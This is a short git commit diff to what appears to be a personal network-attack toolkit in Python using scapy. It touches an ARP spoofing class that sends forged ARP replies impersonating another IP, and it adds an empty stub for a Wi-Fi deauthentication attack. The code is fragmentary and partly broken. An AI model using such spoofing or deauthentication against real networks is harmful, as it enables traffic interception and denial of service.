0415200bb6be47b290dcf8aab1446a609918bc34
the25yahya <yahyaraja.2@gmail.com>
2024-07-28 01:44:28 -0400

    mc

--- tools/attack.py
+++ tools/attack.py
@@ -1,4 +1,4 @@
-from scapy.all import scapy
+from scapy.all import *
 import lib
 
 
@@ -10,3 +10,11 @@ class ARP :
         arp_target = ETHER(dst=target_mac)/ARP(op=2,pdst=self.target,hwdst=target_mac,
                                                psrc=spoof_ip,hwsrc=self.attacker_MAC)
         sendp(arp_target,iface=conf.iface)
+
+
+
+class Wifi : 
+    def __init__(self) -> None:
+        pass
+    def deauthenticate():
+        pass
--- tools/lib.py
+++ tools/lib.py
@@ -15,4 +15,5 @@ def arp_cash():
     print(cash.stdout)
 
 if __name__ == '__main__' :
+    arp_cash()
     get_mac_adress()
